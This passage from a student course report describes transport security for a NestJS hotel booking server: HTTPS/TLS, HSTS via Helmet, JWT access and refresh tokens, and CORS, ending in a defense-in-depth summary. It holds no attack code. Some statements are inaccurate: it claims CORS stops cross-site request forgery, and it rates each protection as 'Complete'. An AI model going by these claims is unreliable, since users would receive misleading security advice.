| **Replay Attack** | Capture and resend valid requests | Perform unauthorized actions |

#### Unprotected Data Flow (DANGEROUS ❌):

```
┌──────────┐         ┌──────────────┐         ┌──────────┐
│  Mobile  │ ──────► │   Attacker   │ ──────► │  Server  │
│   App    │  HTTP   │ (can read!)  │  HTTP   │          │
└──────────┘         └──────────────┘         └──────────┘

Data: { "email": "user@mail.com", "password": "Secret123!" }
      ↑ Visible in plain text!
```

#### Protected Data Flow (SECURE ✅):

```
┌──────────┐         ┌──────────────┐         ┌──────────┐
│  Mobile  │ ──────► │   Attacker   │ ──────► │  Server  │
│   App    │  HTTPS  │ (encrypted!) │  HTTPS  │          │
└──────────┘   🔒    └──────────────┘   🔒    └──────────┘

Data: a7f3b2c9e1d4... (encrypted, unreadable)
```

### 4.2 Multi-Layer Transmission Security

Our project implements **4 layers** of data transmission security:

```
┌────────────────────────────────────────────────────────────────────┐
│                    CLIENT REQUEST                                   │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 1: HTTPS/TLS Encryption                                     │
│  └─ All data encrypted in transit                                  │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 2: HSTS (HTTP Strict Transport Security)                   │
│  └─ Force HTTPS for 1 year, prevent downgrade attacks             │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 3: JWT Authentication                                       │
│  └─ Secure, stateless tokens with expiration                       │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 4: CORS (Cross-Origin Resource Sharing)                     │
│  └─ Restrict which domains can access the API                      │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│                    SERVER RESPONSE                                  │
└────────────────────────────────────────────────────────────────────┘
```

### 4.3 Layer 1: HTTPS/TLS Encryption

#### What is HTTPS/TLS?

**TLS (Transport Layer Security)** encrypts all data between client and server. HTTPS = HTTP + TLS.

```
┌─────────────────────────────────────────────────────────────────────┐
│                    TLS HANDSHAKE PROCESS                            │
└─────────────────────────────────────────────────────────────────────┘

Client                                              Server
   │                                                   │
   │  1. ClientHello (supported ciphers)               │
   │ ─────────────────────────────────────────────────►│
   │                                                   │
   │  2. ServerHello (chosen cipher + certificate)     │
   │ ◄─────────────────────────────────────────────────│
   │                                                   │
   │  3. Verify certificate + generate session key     │
   │ ─────────────────────────────────────────────────►│
   │                                                   │
   │  4. Session established (encrypted communication) │
   │ ◄────────────────────────────────────────────────►│
   │                                                   │
   │           🔒 All data encrypted 🔒                │
```

#### Deployment Configuration:

For production (Railway, Heroku, etc.), HTTPS is handled by the platform:

```yaml
# Railway/Heroku automatically provides HTTPS
# Your NestJS app runs on HTTP internally
# Platform terminates TLS and forwards requests

Client ──HTTPS──► Railway/Heroku ──HTTP──► NestJS App
                  (TLS Termination)
```

### 4.4 Layer 2: HSTS (HTTP Strict Transport Security)

#### Configuration in `src/main.ts`:

```typescript
import helmet from 'helmet';

app.use(
  helmet({
    // HTTP Strict Transport Security - forces HTTPS
    hsts: {
      maxAge: 31536000,       // 1 year in seconds
      includeSubDomains: true, // Apply to all subdomains
      preload: true,          // Allow browser preloading
    },
  }),
);
```

#### How HSTS Works:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    WITHOUT HSTS (VULNERABLE)                        │
└─────────────────────────────────────────────────────────────────────┘

User types: hotel-app.com
     │
     ▼
Browser: http://hotel-app.com  ← Attacker can intercept!
     │
     ▼ (Server redirects)
Browser: https://hotel-app.com


┌─────────────────────────────────────────────────────────────────────┐
│                    WITH HSTS (SECURE)                               │
└─────────────────────────────────────────────────────────────────────┘

User types: hotel-app.com
     │
     ▼
Browser: Automatically uses https://hotel-app.com
         (Browser remembers HSTS for 1 year)
         ↑ Never sends HTTP request - no chance for MITM!
```

#### HSTS Response Header:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

| Directive | Value | Purpose |
|-----------|-------|---------|
| `max-age` | 31536000 (1 year) | How long browser remembers to use HTTPS |
| `includeSubDomains` | true | Apply to api.hotel-app.com, www.hotel-app.com, etc. |
| `preload` | true | Allow inclusion in browser's preload list |

### 4.5 Layer 3: JWT Authentication

#### What is JWT?

**JWT (JSON Web Token)** is a secure, stateless authentication method. The token is signed with a secret key, making it tamper-proof.

#### JWT Structure:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6IlVTRVIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│                                      │                                     │
│           HEADER                     │           PAYLOAD                   │           SIGNATURE
│     (base64 encoded)                 │       (base64 encoded)              │       (HMAC-SHA256)
│                                      │                                     │
└──────────────────────────────────────┴─────────────────────────────────────┴──────────────────────────
```

#### JWT Payload Structure in `src/modules/auth/types/auth.types.ts`:

```typescript
export type JwtPayload = {
  sub: string;                    // User ID
  role: UserRole;                 // USER, ADMIN, etc.
  identifierType: AccountIdentifier;  // EMAIL or PHONE
  identifier: string;             // Actual email or phone value
};
```

#### Token Generation in `src/modules/auth/services/token.service.ts`:

```typescript
@Injectable()
export class TokenService {
  constructor(
    private readonly jwtService: JwtService,
    private readonly configService: ConfigService,
  ) {}

  async generateAccessToken(user: Omit<User, 'password'>) {
    const payload: JwtPayload = {
      sub: user.id,
      role: user.role,
      identifierType: user.identifier_type,
      identifier: user[user.identifier_type.toLowerCase()],
    };
    return this.jwtService.sign(payload);  // Signed with JWT_SECRET
  }

  verifyAccessToken(token: string): JwtPayload {
    return this.jwtService.verify<JwtPayload>(token);  // Verify signature
  }
}
```

#### JWT Strategy in `src/modules/auth/strategies/jwt.strategy.ts`:

```typescript
@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(protected readonly configService: ConfigService) {
    super({
      // Extract token from Authorization: Bearer <token>
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      // Reject expired tokens
      ignoreExpiration: false,
      // Secret key for verification
      secretOrKey: configService.get<string>('JWT_SECRET'),
    });
  }

  async validate(payload: JwtPayload): Promise<JwtUser> {
    return {
      userId: payload.sub,
      role: payload.role,
      identifierType: payload.identifierType,
      identifier: payload.identifier,
    };
  }
}
```

#### Access Token + Refresh Token Pattern:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    AUTHENTICATION FLOW                              │
└─────────────────────────────────────────────────────────────────────┘

1. LOGIN
   Client ──────────────────────────────────────────────────► Server
   { email, password }
                                                                  │
   Client ◄──────────────────────────────────────────────────────┘
   { accessToken (5m), refreshToken (7d) }


2. API REQUEST (with valid access token)
   Client ──────────────────────────────────────────────────► Server
   Authorization: Bearer <accessToken>
                                                                  │
   Client ◄──────────────────────────────────────────────────────┘
   { data... }


3. ACCESS TOKEN EXPIRED
   Client ──────────────────────────────────────────────────► Server
   POST /auth/refresh
   { refreshToken }
                                                                  │
   Client ◄──────────────────────────────────────────────────────┘
   { newAccessToken, newRefreshToken }
```

#### Refresh Token Service in `src/modules/auth/services/refresh-token.service.ts`:

```typescript
@Injectable()
export class RefreshTokenService {
  
  async createRefreshToken(userId: string, ip?: string, device?: string) {
    // Store refresh token in database (allows revocation)
    const token = await this.databaseService.refreshToken.create({
      data: {
        token: uuidv4(),
        userId,
        ip,
        device,
        expiresAt: new Date(Date.now() + this.getRefreshTokenTTL()), // 7 days
      },
    });

    // Create signed JWT containing token ID
    const payload: RefreshTokenPayload = {
      jti: token.id,  // Token ID in database
      sub: userId,
    };

    return this.jwtService.sign(payload, {
      expiresIn: '7d',
    });
  }

  async revokeRefreshToken(userId: string, tokenId?: string) {
    // Mark token as revoked (user logout, security breach, etc.)
    await this.databaseService.refreshToken.update({
      where: { id: tokenId },
      data: { isRevoked: true },
    });
  }

  // Cleanup expired tokens daily
  @Cron(CronExpression.EVERY_DAY_AT_MIDNIGHT)
  async cleanupRefreshTokens() {
    await this.databaseService.refreshToken.deleteMany({
      where: {
        OR: [
          { isRevoked: true },
          { expiresAt: { lt: new Date() } },
        ],
      },
    });
  }
}
```

#### Token Security Comparison:

| Feature | Access Token | Refresh Token |
|---------|--------------|---------------|
| **Lifetime** | Short (5 minutes) | Long (7 days) |
| **Storage** | Memory/SecureStorage | Secure HTTP-only cookie |
| **Purpose** | API authentication | Get new access tokens |
| **If Stolen** | Limited damage (expires soon) | Can be revoked |
| **Contains** | User ID, role, identifier | Token ID, user ID |

### 4.6 Layer 4: CORS (Cross-Origin Resource Sharing)

#### Configuration in `src/main.ts`:

```typescript
// CORS configuration - environment-based
const allowedOrigins = configService.get<string>('CORS_ORIGINS') || '*';
const isProduction = configService.get<string>('NODE_ENV') === 'production';

app.enableCors({
  origin:
    isProduction && allowedOrigins
      ? allowedOrigins.split(',').map((origin) => origin.trim())
      : true,  // Allow all origins in development
  methods: 'GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS',
  credentials: true,
  allowedHeaders: 'Content-Type, Accept, Authorization, Accept-Language',
  exposedHeaders: ['X-Total-Count', 'X-Total-Pages'],
});
```

#### Environment Configuration:

```env
# .env.production
CORS_ORIGINS=https://hotel-app.com,https://admin.hotel-app.com
NODE_ENV=production
```

#### How CORS Works:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    WITHOUT CORS (DANGEROUS)                         │
└─────────────────────────────────────────────────────────────────────┘

evil-site.com ──► hotel-api.com ──► User's data stolen!
                (No origin check)


┌─────────────────────────────────────────────────────────────────────┐
│                    WITH CORS (SECURE)                               │
└─────────────────────────────────────────────────────────────────────┘

hotel-app.com ──► hotel-api.com ──► ✅ Allowed (in whitelist)

evil-site.com ──► hotel-api.com ──► ❌ Blocked (not in whitelist)
                                    Response: CORS error
```

#### CORS Preflight Request:

```http
# Browser sends OPTIONS request first
OPTIONS /api/bookings HTTP/1.1
Origin: https://hotel-app.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization, Content-Type

# Server responds with allowed origins
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://hotel-app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Accept, Authorization
Access-Control-Allow-Credentials: true
```

#### CORS Configuration Options:

| Option | Value | Purpose |
|--------|-------|---------|
| `origin` | List of allowed domains | Only these domains can call API |
| `methods` | HTTP methods allowed | Which operations are permitted |
| `credentials` | `true` | Allow cookies/auth headers |
| `allowedHeaders` | Header list | Which headers client can send |
| `exposedHeaders` | Header list | Which headers client can read |

### 4.7 Complete Request Security Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│  Mobile App: POST /api/bookings                                     │
│  Headers: Authorization: Bearer eyJhbGciOiJIUzI1...                 │
│  Body: { hotelId: "123", dates: [...] }                             │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              │ HTTPS (TLS 1.3 encrypted)
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Railway/Heroku (TLS Termination)                                   │
│  - Decrypts HTTPS                                                   │
│  - Forwards to NestJS app                                           │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  NestJS App                                                         │
│  1. Check CORS origin ✓                                             │
│  2. Verify JWT signature ✓                                          │
│  3. Check token expiration ✓                                        │
│  4. Extract user from token ✓                                       │
│  5. Process request                                                 │
│  6. Add security headers (Helmet)                                   │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Response with Security Headers:                                    │
│  - Strict-Transport-Security: max-age=31536000                      │
│  - Content-Security-Policy: default-src 'self'                      │
│  - X-Frame-Options: DENY                                            │
│  - X-Content-Type-Options: nosniff                                  │
└─────────────────────────────────────────────────────────────────────┘
```

### 4.8 Data Transmission Security Summary

| Layer | Technology | Protection Against |
|-------|------------|-------------------|
| **HTTPS/TLS** | TLS 1.3 | Eavesdropping, MITM attacks |
| **HSTS** | Helmet | SSL stripping, downgrade attacks |
| **JWT** | @nestjs/jwt + Passport | Unauthorized access, session hijacking |
| **CORS** | NestJS enableCors | Cross-site request forgery, unauthorized origins |

**Result:** All data transmitted between mobile app and server is encrypted, authenticated, and protected from unauthorized access.

---

## 5. Conclusion

### Security Implementation Summary

This document has covered the comprehensive security implementation for the AHomeVilla Hotel Booking Server:

| Security Requirement | Technologies Used | Protection Level |
|---------------------|-------------------|------------------|
| **SQL Injection** | Prisma ORM (parameterized queries) | ✅ Complete |
| **XSS Attacks** | Helmet + sanitize-html + @Sanitize() | ✅ Complete |
| **Password-Guessing** | Throttler + Account Lockout + bcrypt | ✅ Complete |
| **Data Transmission** | HTTPS + HSTS + JWT + CORS | ✅ Complete |

### Defense in Depth Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                        INTERNET                                      │
└─────────────────────────────────────────────────────────────────────┘
                              │
              ┌───────────────┴───────────────┐
              │   TLS/HTTPS Encryption        │  Layer 1
              └───────────────┬───────────────┘
                              │
              ┌───────────────┴───────────────┐
              │   CORS Origin Validation      │  Layer 2
              └───────────────┬───────────────┘
                              │
              ┌───────────────┴───────────────┐
              │   Rate Limiting (Throttler)   │  Layer 3
              └───────────────┬───────────────┘
                              │
              ┌───────────────┴───────────────┐
              │   JWT Authentication          │  Layer 4
              └───────────────┬───────────────┘
                              │
              ┌───────────────┴───────────────┐
              │   Input Sanitization (XSS)    │  Layer 5
              └───────────────┬───────────────┘
                              │
              ┌───────────────┴───────────────┐
              │   Input Validation            │  Layer 6
              └───────────────┬───────────────┘
                              │
              ┌───────────────┴───────────────┐
              │   Account Lockout             │  Layer 7
              └───────────────┬───────────────┘
                              │
              ┌───────────────┴───────────────┐
              │   Parameterized Queries       │  Layer 8
              └───────────────┬───────────────┘
                              │
              ┌───────────────┴───────────────┐
              │   Password Hashing (bcrypt)   │  Layer 9
              └───────────────┬───────────────┘
                              │
┌─────────────────────────────────────────────────────────────────────┐
│                        DATABASE                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Key Takeaways

1. **No single security measure is sufficient** - Use defense in depth
2. **Use proven libraries** - Don't reinvent security (Prisma, bcrypt, Helmet, etc.)
3. **Validate all input** - Never trust user input
4. **Encrypt in transit** - Always use HTTPS
5. **Implement rate limiting** - Prevent automated attacks
6. **Use short-lived tokens** - Minimize impact of token theft
7. **Hash passwords properly** - bcrypt with adequate salt rounds
8. **Keep dependencies updated** - Security patches are critical

---

*Document Version: 1.0*
*Last Updated: December 28, 2025*
*Project: AHomeVilla Hotel Booking Server*
*Course: Security in Mobile Development*
